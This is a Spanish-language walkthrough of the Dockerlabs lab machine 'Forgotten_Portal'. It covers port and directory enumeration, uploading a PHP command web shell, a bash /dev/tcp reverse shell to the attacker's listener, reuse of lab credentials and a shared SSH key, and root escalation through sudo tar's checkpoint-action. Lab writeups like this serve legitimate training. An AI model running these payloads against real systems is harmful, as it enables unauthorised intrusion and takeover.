
# Writeup Template: Maquina `[ Forgotten_Portal ]`

- Tags: #Forgotten_Portal 
- Dificultad: `[ Media ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina Forgotten_Portal](https://mega.nz/file/WdUHiRoR#rLenZ3_90tt9g41RwHwDZIi6zJ0wU0HK49hKlDGhvAc)

## Configuracion del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x forgotten_portal.zip
sudo bash auto_deploy.sh forgotten_portal.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p22,80 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58 ((UbuntuNoble))
```
---

## Enumeracion de [Servicio Web Principal]
direccion **URL** del servicio:
```bash
http://172.17.0.2/
```

Revisando el codigo fuente tenemos el siguiente comentario:
```bash
<!-- Nota: Bob ha implementado una nueva funcionalidad en m4ch1n3_upload.html. Ahora permite analizar metadatos de los archivos subidos.Esto mejora la capacidad de gestionar información crítica y detectar posibles anomalías en los datos. -->
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://172.17.0.2/ # No reporta nada critico
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 172.17.0.2
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
```bash
/uploads/             (Status: 200) [Size: 741]
```

### Descubrimiento de Archivos
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php,php.back,backup,txt,sh,html,js
```

- **Hallazgos**:
```bash
/index.html           (Status: 200) [Size: 3010]
/contact.html         (Status: 200) [Size: 826]
/blog.html            (Status: 200) [Size: 931]
/uploads              (Status: 301) [Size: 310] [--> http://172.17.0.2/uploads/]
/team.html            (Status: 200) [Size: 1327]
/script.js            (Status: 200) [Size: 1749]
```
### Credenciales Encontradas
En esta ruta cuando accedemos nos muestra los nombres de 3 potenciales usuarios del sistema:
```bash
http://172.17.0.2/team.html

alice
bob
charlie
```

En esta ruta **m4ch1n3_upload.html** que esta mencionada desde los comentario en la pagina principal:
```bash
http://172.17.0.2/m4ch1n3_upload.html
```

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
En la web nos indica que podemos subir archivos: Tipos de archivo soportados: **.txt, .pdf, .php** asi que si podemos subir archivos php podemos aprovecharnos para subir uno malicioso:
**Nota** En caso de que no se logre ejecutar nuestro archivo, Probaremos con un ataque de extensiones

### Ejecucion del Ataque
Subiremos un archvo bajo el nombre: **shell.php** con la siguiente ruta:
```bash
http://172.17.0.2/m4ch1n3_upload.html
```

**shell.php**
```php
<?php
  system($_GET["cmd"]);
?>
```

Desde la misma web nos da la facilidad de acceder a nuestro archvio, Logrando tener **RCE**
```bash
# Comandos para explotación
http://172.17.0.2/uploads/shell.php?cmd=whoami
```

### Intrusion
Modo escucha para ganar acceso al objetivo
```bash
nc -nlvp 443
```

```bash
# Reverse shell o acceso inicial
172.17.0.2/uploads/shell.php?cmd=bash -c 'exec bash -i %26>/dev/tcp/172.17.0.1/443 <%261'
```

---

## Escalada de Privilegios
### Enumeracion del Sistema
```bash
# Comandos clave ejecutados
ls -la
```

**Hallazgos Clave:**
Listando los archivos de la ruta: **( /var/www/data )** tenemos el siguiete archivo:
```bash
access_log
```
### Explotacion de Privilegios

###### Usuario `[ www-date ]`:
Este archivo contiene informacion que nos puede ser de ayuda:
```bash
# --- Access Log ---
# Fecha: 2023-11-22
# Descripción: Registro de actividad inusual detectada en el sistema.
# Este archivo contiene eventos recientes capturados por el servidor web.

[2023-11-21 18:42:01] INFO: Usuario 'www-data' accedió a /var/www/html/.
[2023-11-21 18:43:45] WARNING: Intento de acceso no autorizado detectado en /var/www/html/admin/.
[2023-11-21 19:01:12] INFO: Script 'backup.sh' ejecutado por el sistema.
[2023-11-21 19:15:34] ERROR: No se pudo cargar el archivo config.php. Verifique las configuraciones.

# --- Logs del sistema ---
[2023-11-21 19:20:00] INFO: Sincronización completada con el servidor principal.
[2023-11-21 19:35:10] INFO: Archivo temporal creado: /tmp/tmp1234.
[2023-11-21 19:36:22] INFO: Clave codificada generada: YWxpY2U6czNjcjN0cEBzc3cwcmReNDg3
[2023-11-21 19:50:00] INFO: Actividad normal en el servidor. No se detectaron anomalías.
[2023-11-22 06:12:45] WARNING: Acceso sospechoso detectado desde IP 192.168.1.100.

# --- Fin del Log ---
```

Tenemos esta linea que contiene una cadena en **base64**
```bash
[2023-11-21 19:36:22] INFO: Clave codificada generada: YWxpY2U6czNjcjN0cEBzc3cwcmReNDg3
```

Procedemos a decodificarla:
```bash
echo "YWxpY2U6czNjcjN0cEBzc3cwcmReNDg3" | base64 -d
```

tenemos credenciales de acceso de este usuario:
```bash
alice:s3cr3tp@ssw0rd^487 # Credenciales de acceso
```

Migramos a ese usuario:
```bash
# Comando para escalar al usuario: ( alice )
ssh-keygen -R 172.17.0.2 && ssh alice@172.17.0.2 # ( s3cr3tp@ssw0rd^487 )
```

###### Usuario `[ Alice ]`:
En esta ruta de este usuario:
```bash
/home/alice/incidents
```

Tenemos un archivo que contien el reporta del sistema, Si miramos el contenido tenemos lo siguiente:
```bash
=== INCIDENT REPORT ===
Archivo generado automaticamente por el sistema de auditoria interna de CyberLand Labs.

Fecha: 2023-11-22  
Auditor Responsable: Alice Carter  
Asunto: Configuracion Erronea de Claves SSH  

=== DESCRIPCION ===  
Durante una reciente auditoria de seguridad en nuestro servidor principal, descubrimos un grave error de configuracion en el sistema de autenticacion SSH. El problema parece originarse en un script automatizado utilizado para generar claves RSA para los usuarios del sistema.

En lugar de crear claves unicas para cada usuario, el script genero una unica clave `id_rsa` y la replico en todos los directorios de usuario en el servidor. Ademas, la clave esta protegida por una passphrase que, aunque tecnicamente existe, no ofrece ningun nivel real de seguridad.

=== HALLAZGO ADICIONAL ===  
Durante el analisis, encontramos que la passphrase de la clave privada del usuario `bob` se almaceno accidentalmente en un archivo temporal en el sistema. El archivo no ha sido eliminado, lo que significa que la passphrase esta ahora expuesta.

**Passphrase del Usuario `bob`:** `cyb3r_s3curity`

=== DETALLES DE LA CONFIGURACION ===  
Clave Privada: id_rsa  
Passphrase: cyb3r_s3curity  
Ubicacion: Copiada en todos los directorios `/home/<usuario>/.ssh/`

=== CONSECUENCIAS ===  
1. **Perdida de Privacidad**: Todos los usuarios comparten la misma clave, lo que significa que cualquiera puede autenticarse como cualquier otro usuario si obtiene acceso a la clave.  

=== POSIBLES SOLUCIONES ===  
- Implementar un sistema centralizado de gestion de claves.  
- Forzar a los usuarios a cambiar sus claves regularmente.  
- Actualizar las politicas internas para prohibir el uso de scripts inseguros en la configuracion de credenciales.  

=== NOTA FINAL ===  
Este incidente pone de manifiesto la importancia de revisar las configuraciones criticas en sistemas sensibles. Es crucial que todo el equipo de IT se mantenga alerta y que se implementen controles mas estrictos para evitar errores similares en el futuro.

--- FIN DEL INFORME ---
```

Sabiendo esta falla de segurida critica en el sistema, Nos permitiria **pivotear** entre todos los usuarios del sitema
**Nota** Para que funcione logueranos tendremos que dar el permiso: **600** para las **id_rsa**
```bash
chmod 600 id_rsa
```

Ahora migramos al usuario **bob**
```bash
ssh -i id_rsa bob@172.17.0.2 # ( cyb3r_s3curity )
```

###### Usuario `[ bob ]`:
Listando los permisos para este usuario tenemos estos permisos:
```bash
sudo -l

User bob may run the following commands on 8b13005030df:
    (ALL) NOPASSWD: /bin/tar
```

Explotamos el privilegio:
```bash
comando para migrar al usuario: ( root )
sudo -u root tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

---

## Evidencia de Compromiso
Flags:
```bash
-rw-r--r--  1 root root 10240 Nov 25  2024 archive.tar
-rw-r--r--  1 root root    31 Nov 25  2024 root.txt
```

```bash
# Captura de pantalla o output final
root@8b13005030df:~# whoami
root
```

---
